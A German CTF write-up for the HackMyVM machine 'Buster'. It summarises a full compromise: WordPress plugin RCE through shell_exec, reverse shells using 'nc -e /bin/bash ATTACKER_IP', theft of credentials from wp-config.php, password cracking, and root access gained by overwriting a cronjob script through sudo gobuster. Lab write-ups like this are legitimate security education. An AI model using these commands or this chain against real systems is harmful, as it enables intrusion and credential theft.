# Buster - HackMyVM (Easy)

![Buster Icon](buster.png)

## Übersicht

*   **VM:** Buster
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=buster)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2025-01-26
*   **Original-Writeup:** https://alientec1908.github.io/buster_HackMyVM_Easy/
*   **Autor:** Ben C. 

## Kurzbeschreibung

Die virtuelle Maschine "Buster" von HackMyVM (Schwierigkeitsgrad: Easy) präsentierte eine Reihe von Schwachstellen, die eine schrittweise Kompromittierung bis zum Root-Zugriff ermöglichten. Der initiale Zugriff erfolgte über eine Remote Code Execution (RCE) Schwachstelle in einem WordPress Plugin (vermutlich WP Query Console). Durch Post-Exploitation wurden Datenbank-Credentials offengelegt, die das Knacken eines lokalen Benutzerpassworts erlaubten. Eine unsichere `sudo`-Konfiguration für diesen Benutzer ermöglichte schließlich die Manipulation eines Cronjobs und damit die Erlangung von Root-Rechten.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `ip`, `grep`, `awk`, `sort` (für IPv6 Nmap Target Discovery)
*   `curl`
*   `nikto`
*   `gobuster`
*   `jq`
*   `wpscan`
*   `msfconsole` (im Writeup gelistet, aber konkrete Nutzung nicht ersichtlich, ggf. für Recherche)
*   `searchsploit` (im Writeup gelistet, aber konkrete Nutzung nicht ersichtlich, ggf. für Recherche)
*   `hydra` (im Writeup gelistet, aber konkrete Nutzung nicht ersichtlich)
*   `wfuzz` (im Writeup gelistet, aber konkrete Nutzung nicht ersichtlich)
*   Burp Suite
*   `tcpdump`
*   `nc` (netcat)
*   `stty`
*   `python3` (für HTTP Server)
*   `ls`, `cat`, `id`, `su`, `find`, `ss`, `echo`, `chmod`, `mkdir`
*   `mysql` (Client)
*   `john` (John the Ripper)
*   `sudo`
*   `pspy`

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Buster" erfolgte in mehreren Schritten:

1.  **Reconnaissance & Enumeration:**
    *   Ziel-IP (`192.168.2.162`, Hostname `buster.hmv`) mittels `arp-scan` und Eintrag in `/etc/hosts` identifiziert.
    *   Umfangreiche `nmap`-Scans (TCP, UDP, SCTP, IPv6, Vuln-Scripts) zeigten offene Ports 22 (OpenSSH 7.9p1) und 80 (Nginx 1.14.2), auf dem eine WordPress-Instanz (Version 6.7.1, Titel "bammmmuwe") lief. Zahlreiche CVEs wurden für SSH und Nginx gemeldet, aber nicht primär ausgenutzt.
    *   HTTP-Analyse mit `curl`, `nikto` und `gobuster` bestätigte WordPress und deckte Standardpfade, fehlende Sicherheitsheader und den `X-Redirect-By: WordPress` Header auf.

2.  **WordPress Analyse & Schwachstellenfindung:**
    *   Manuelle Analyse und `curl` der WordPress REST API (`/wp-json/wp/v2/users`) offenbarte den Benutzer `ta0`.
    *   Login-Fehlermeldungen bestätigten die Existenz von `ta0`.
    *   `wpscan` konnte kein Passwort für `ta0` finden, enumerierte aber einen weiteren Benutzer: `welcome`.
    *   Entdeckung des kritischen Endpunkts `/wp-json/wqc/v1/query` (vermutlich "WordPress Query Console").

3.  **Initial Access (RCE via WQC):**
    *   Der WQC-Endpunkt erlaubte via POST-Request mit JSON-Body (`{"queryArgs":"<PHP_CODE>","queryType":"post"}`) die Ausführung von PHP-Code.
    *   `phpinfo()` wurde ausgeführt; `disable_functions` war aktiv, ließ aber `shell_exec` zu.
    *   Blind RCE wurde via `shell_exec('ping ...')` und `tcpdump` bestätigt.
    *   Eine Reverse Shell wurde mit `shell_exec('nc -e /bin/bash ATTACKER_IP 4445')` als Benutzer `www-data` erlangt.

4.  **Post-Exploitation (als www-data):**
    *   Die Datei `wp-config.php` wurde gefunden und enthielt Datenbank-Credentials: Benutzer `ll104567` mit Passwort `thehandsomeguy`.
    *   Mit diesen Credentials wurde auf die lokale MySQL-Datenbank zugegriffen.
    *   Aus der Tabelle `wp_users` wurden die Passwort-Hashes (Format `$P$`) für `ta0` und `welcome` (`$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/`) extrahiert.

5.  **Privilege Escalation (www-data zu welcome):**
    *   Der Passwort-Hash für `welcome` wurde mit `john` und `rockyou.txt` geknackt: `104567`.
    *   Mit `su welcome` und dem Passwort `104567` wurde erfolgreich zum Benutzer `welcome` gewechselt.
    *   Die User-Flag wurde im Home-Verzeichnis von `welcome` gefunden.

6.  **Privilege Escalation (welcome zu root):**
    *   `sudo -l` für `welcome` zeigte: `(ALL) NOPASSWD: /usr/bin/gobuster`.
    *   `pspy` deckte einen Cronjob auf, der minütlich als `root` das Skript `/opt/.test.sh` ausführt.
    *   Der Exploit:
        1.  Ein Reverse-Shell-Payload (`nc -e /bin/bash ATTACKER_IP 5555`) wurde in eine Datei `/tmp/payload` auf dem Zielsystem geschrieben.
        2.  Ein Python HTTP-Server wurde auf der Angreifer-Maschine gestartet, um `/tmp/payload` bereitzustellen.
        3.  `sudo gobuster dir -u http://ATTACKER_IP/tmp/payload -w <dummy_wordlist_containing_single_entry_that_resolves_to_payload> -o /opt/.test.sh` wurde ausgeführt. `gobuster` (als root) forderte den Payload vom Angreifer-Server an und schrieb dessen Inhalt (den `nc`-Befehl) dank der `-o` Option in `/opt/.test.sh`.
        4.  Der Cronjob führte kurz darauf `/opt/.test.sh` aus und etablierte eine Reverse Shell als `root`.
    *   Die Root-Flag wurde im `/root`-Verzeichnis gefunden.

## Wichtige Schwachstellen und Konzepte

*   **WordPress Plugin Schwachstelle (RCE):** Ein unsicherer API-Endpunkt (`/wp-json/wqc/v1/query`) erlaubte PHP-Code-Ausführung über `shell_exec` trotz einiger `disable_functions`.
*   **Klartext-Credentials:** Datenbankzugangsdaten in `wp-config.php`.
*   **Schwache Passwörter & Hash Cracking:** Ein WordPress-Benutzerpasswort (`$P$` Hash) konnte offline geknackt werden.
*   **Unsichere `sudo`-Konfiguration:** Erlaubte die Ausführung von `gobuster` als `root` ohne Passwort, was durch die `-o` Option (Output in Datei schreiben) missbraucht wurde.
*   **Cronjob Manipulation:** Ein als `root` laufender Cronjob, der ein von einem weniger privilegierten Benutzer (indirekt via `sudo gobuster`) beschreibbares Skript ausführt.
*   **Benutzer-Enumeration:** Über WordPress REST API und spezifische Login-Fehlermeldungen.
*   **Blind RCE:** Bestätigung der Codeausführung ohne direkte Ausgabe durch Überwachung des Netzwerkverkehrs (ICMP).

## Flags

*   **User Flag (`/home/welcome/user.txt`):** `29e0f786e8c90b3ce82e00de0ec7e7d3`
*   **Root Flag (`/root/R00t_fl4g_is_HHHHerererererrererere.txt`):** `b6a1a0de4223ba038327fc9c647701fb`

## Tags

`HackMyVM`, `Buster`, `Easy`, `WordPress`, `RCE`, `WQC`, `shell_exec`, `wp-config`, `Password Cracking`, `JohnTheRipper`, `Sudo Privilege Escalation`, `Gobuster`, `Cronjob Manipulation`, `pspy`, `Linux`, `Web`
